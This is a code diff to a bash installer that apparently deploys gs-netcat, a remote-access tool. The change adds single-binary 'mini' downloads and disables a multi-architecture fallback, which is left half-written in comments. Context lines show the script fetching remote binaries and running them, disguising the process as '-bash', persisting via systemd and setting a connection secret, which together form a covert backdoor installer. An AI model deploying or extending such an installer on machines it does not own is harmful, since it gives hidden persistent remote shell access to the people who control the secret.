@@ -596,6 +596,7 @@ init_vars()
 	}
 
 	unset OSARCH
+	unset SRC_PKG
 	# User supplied OSARCH
 	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
 
@@ -607,6 +608,7 @@ init_vars()
 				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64-linux"
+				SRC_PKG="gs-netcat_mini-linux-aarch64"
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64-alpine"
 				# Go 32-bit if Little Endian even if 64bit arch
@@ -633,7 +635,11 @@ init_vars()
 				# OSARCH="i386-hurd" # debian-hurd
 		fi
 
-		[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
+		[[ -z "$OSARCH" ]] && {
+			# Default: Try Alpine(muscl libc) 64bit
+			OSARCH="x86_64-alpine"
+			SRC_PKG="gs-netcat_mini-linux-x86_64"
+		}
 	fi
 
 	# Docker does not set USER
@@ -644,7 +650,7 @@ init_vars()
 	try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
@@ -1431,28 +1437,31 @@ try_network()
 	WARN_EXECFAIL
 }
 
-# try <osarch>
+# try <osarch> <srcpackage>
 try()
 {
-	local osarch
-	local src_pkg
-	osarch="$1"
+	local osarch="$1"
+	local src_pkg="$2"
 
-	src_pkg="gs-netcat_${osarch}.tar.gz"
+	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
 	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
 	echo -en "Downloading binaries.................................................."
-	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
+	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
 	OK_OUT
 
 	echo -en "Unpacking binaries...................................................."
-	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
-	[[ -n $GS_USELOCAL_GSNC ]] && {
-		[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-		xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
-	}
+	if [[ "${src_pkg}" == *.tar.gz ]]; then
+		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
+		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		[[ -n $GS_USELOCAL_GSNC ]] && {
+			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
+			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+		}
+	else
+		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
+	fi
 	OK_OUT
 
 	echo -en "Copying binaries......................................................"
@@ -1472,21 +1481,26 @@ try()
 
 # Download the gs-netcat_any-any.tar.gz and try all of the containing
 # binaries and fail hard if none could be found.
-try_any()
-{
-	targets="x86_64-alpine i386-alpine aarch64-linux arm-linux x86_64-osx x86_64-cygwin i686-cygwin mips32-alpine mipsel32-alpine x86_64-freebsd"
-	for osarch in $targets; do
-		[[ "$osarch" == "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
-		try "$osarch"
-		[[ -n "$IS_TESTBIN_OK" ]] && break
-	done
+# try_any()
+# {
+# 	local i
+# 	# targets="x86_64-alpine i386-alpine aarch64-linux arm-linux x86_64-osx x86_64-cygwin i686-cygwin mips32-alpine mipsel32-alpine x86_64-freebsd"
+# 	targets=(x86_64-alpine            i386-alpine                aarch64-linux                arm-linux x86_64-osx x86_64-cygwin i686-cygwin mips32-alpine mipsel32-alpine x86_64-freebsd)
+# 	pkgs=(gs-netcat_mini-linux-x86_64 gs-netcat_${OSARCH}.tar.gz gs-netcat_mini-linux-aarch64 )
+# 	for i in "${!targets[@]}"; do
+# 	done
+# 	for osarch in $targets; do
+# 		[[ "$osarch" == "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
+# 		try "$osarch"
+# 		[[ -n "$IS_TESTBIN_OK" ]] && break
+# 	done
 
-	if [[ -n "$IS_TESTBIN_OK" ]]; then
-		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
-	else
-		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
-	fi
-}
+# 	if [[ -n "$IS_TESTBIN_OK" ]]; then
+# 		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
+# 	else
+# 		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+# 	fi
+# }
 
 gs_start_systemd()
 {
@@ -1585,9 +1599,9 @@ else
 	GS_SECRET="$S"
 fi
 
-try "$OSARCH"
+try "$OSARCH" "$SRC_PKG"
 
-[[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
+# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 
